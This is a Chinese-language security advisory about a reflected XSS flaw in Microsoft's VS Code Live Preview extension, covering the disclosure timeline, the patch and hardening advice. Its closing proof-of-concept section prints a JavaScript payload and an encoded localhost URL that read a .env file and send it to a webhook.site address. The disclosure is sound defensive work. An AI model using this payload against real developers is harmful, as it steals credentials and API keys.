#  VS Code 高人气预览插件曝出高危XSS漏洞，可窃取本地文件  
 幻泉之洲   2026-02-27 01:43  
  
> OX Research 团队发现，微软一款拥有超1100万下载量的 VS Code 官方扩展“Live Preview”存在严重安全漏洞。攻击者可通过恶意网站，向该插件启动的本地预览服务器发送请求，从而枚举并窃取开发者电脑上的敏感文件，比如.env里的密钥和API凭证。漏洞已在9月悄悄修复。  
  
  
漏洞能让攻击者把本地文件偷走。在负责任的披露之后，微软已经“悄悄”打了补丁——如果你安装了，请赶紧更新。  
  
OX Research 团队在一个很受欢迎的微软 VS Code 插件里发现了一个漏洞。这个漏洞能让恶意网站绕开安全限制，直接访问开发者电脑上的敏感文件。利用这个“Live Preview”服务器，攻击者可以在不用任何身份验证的情况下，远程偷走你的登录凭证、访问密钥和其他私密数据。  
  
这个漏洞有点严重。  
## 漏洞速览  
- 严重程度：高危  
  
- 受影响的IDE：VS Code  
  
- 受影响的扩展：Live Preview  
  
- 受影响版本：0.4.16之前的所有版本  
  
- 可能造成的后果：数据泄露  
  
## 我们发现了什么  
  
OX Research 团队确认了一个漏洞：一个恶意网站发起的未经验证的请求，可以枚举开发者电脑上运行着 Live Preview 服务器的内部根目录文件。这让攻击者能够发出精心构造的JavaScript请求，访问敏感的本地文件，并把密钥、访问令牌和其他凭证偷偷发到一个远程服务器上去。  
  
这是一个官方的微软 Visual Studio Code 扩展，下载量超过1100万次，这让全球大量的用户都暴露在风险之中。任何一个能利用这个问题的攻击者，都有可能拿到开发者电脑上存储的那些敏感凭证和其他私有信息。  
## 谁受影响？  
  
Live Preview 的下载量早破了1100万。任何还在用旧版本的开发者，都可能中招。  
## 可能造成的损害  
- 数据泄露——从开发者的电脑里提取敏感数据。  
  
## 负责任的披露过程  
  
我们在2025年8月7日把这个漏洞报给了微软。微软一开始觉得这个问题严重性不高，认为这需要用户交互、且有特定条件限制。但到了2025年9月11日，微软没跟我们打招呼，就悄悄发布了一个补丁（版本 0.4.16），把我们报告的XSS安全问题给修了。我们直到最近才发现这个补丁已经上线了。  
  
补丁记录参考：  
  
https://github.com/microsoft/vscode-livepreview/blob/main/CHANGELOG.md。  
## 建议  
- 如果你IDE里装了 Live Preview，现在就更新它。  
  
### 保护开发环境的一些好习惯  
- 禁用或卸载非必要的扩展：把那些当前工作用不上的开发工具、扩展或服务关掉或卸载，能小点受攻击的可能。  
  
- 加固本地网络：用一个配置得比较好的本地防火墙，限制开发服务的进站和出站连接，确保只在确实需要、而且是来自可信来源的时候才能访问。  
  
- 坚持严格的更新计划：养成习惯，及时给所有软件打上安全补丁，包括IDE、扩展、操作系统和开发依赖项，这样已知漏洞能快点被解决。  
  
- 不用时就关掉基于本地主机的服务：把那些暴露本地主机端点的开发服务或扩展关掉，别让它闲着，能降低风险。  
  
## 技术分析  
### 攻击场景：在现实里怎么利用？  
- 窃取敏感源代码——爬取本地主机可能会暴露专有代码、脚本或配置文件。  
  
- 泄露凭证——任何文件，包括.env文件里的环境变量，只要包含了API密钥、密码或者.env里的秘密，都可能被发送到攻击者控制的域里。  
  
### 攻击路径图  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibeXdnzSZe5J0LCuicPlR2m5n2RjxJlPkbslX0SurlTvK1RBTgvTwwK2VPSrU3Yahh5kEibR1zTibL0mmoPDk3fvbOicKVTHBoUY5Ws/640?wx_fmt=webp&from=appmsg "")  
  
这个扩展允许开发者通过一个运行在开发者电脑上的嵌入式HTTP服务器，直接在IDE里本地渲染和测试网页。因为它暴露的是一个受信的本机服务，还要处理网页请求，所以它的安全性就特别要紧——任何弱点都可能模糊本地开发资源和不受信任的外部内容之间的界限。  
  
我们在分析时发现，恶意网站可以向 Live Preview 服务器发送未经认证的请求，然后它就能枚举开发者电脑上的内部根目录文件。这个行为能让攻击者精心制作有针对性的JavaScript请求，访问敏感的本地文件，并把密钥、访问令牌和开发者凭证泄露到远程服务器。  
### 工作原理  
  
研究过程中，我们发现恶意网站可以触发请求到运行在开发者本机上的 Live Preview 服务器。这些请求让攻击者能访问本地机器上的敏感文件，并把它们发送到攻击者控制的环境里。我们是通过分析 Live Preview 服务器如何处理来自不可信来源的请求，并观察到它在没做任何身份验证的情况下就暴露本地文件系统数据，才发现的这个问题。  
  
看看那段负责处理“页面不存在”情况的代码——比如，当开发者试图访问一个不存在的文件时：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibfE0ZVPNEFoK1gE9aBtwniaJeaa4ODEwZgTyvQrEWM4N71AaWzmicIFZIKcV78Jvs29xzBW4BOjkicmPEcwVzukib0tN6tMibHtxznQ/640?wx_fmt=webp&from=appmsg "")  
  
由于 relativePathFormatted 这个参数没有被转义，我们就能往里面注入攻击载荷。然后这东西会被反射回页面，结果就造成了一个反射型XSS漏洞。  
  
在我们披露之后，应用到扩展上的修复补丁说明，这个让攻击成为可能的反射型XSS漏洞已经被堵上了。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibffFIMOCfCcV2DXweib1YJrT2BEZ9q8og96zXnCq8zqUF0Q5clr8XJsYlG3sm67ATKQbkbnBPePFL0roxMbHlXkCj07ET1Ama2M/640?wx_fmt=webp&from=appmsg "")  
  
检查我们披露后应用的修复，我们可以看到，扩展现在用了一个 escapeHTML 函数来防止以前让攻击成为可能的XSS漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibeH4JibqA9umLKCZQP0MlynotgI0kg1McyIYbsAkcbBsUuophDZ32klBYWIRNiaibupU8LZxBibKWEqm7J175UyPeiahGDticEn9aIok/640?wx_fmt=webp&from=appmsg "")  
  
之后我们用之前制作的那个漏洞利用程序重新测试了一下，确认问题已经被完全修复了。  
## 视频概念验证  
  
  
我们能用下面的攻击载荷把敏感文件偷走：  
  
URL里的JavaScript代码：  
  
(()=>{fetch('/.env').then(r=>r.text()).then(t=>fetch('https://webhook.site//?data='+encodeURIComponent(t)));})()  
  
恶意URL示例：  
  
http://localhost%3A3000%2F%3Cscript%3E%28%28%29%3D%3E%7Bfetch%28%27%2F%2Eenv%27%29%2Ethen%28r%3D%3Er%2Etext%28%29%29%2Ethen%28t%3D%3Efetch%28%27https%3A%2F%2Fwebhook%2Esite%2F%3CSNIP%3E%2F%3Fdata%3D%27%2BencodeURIComponent%28t%29%29%29%3B%7D%29%28%29%3C%2Fscript%3E  
  
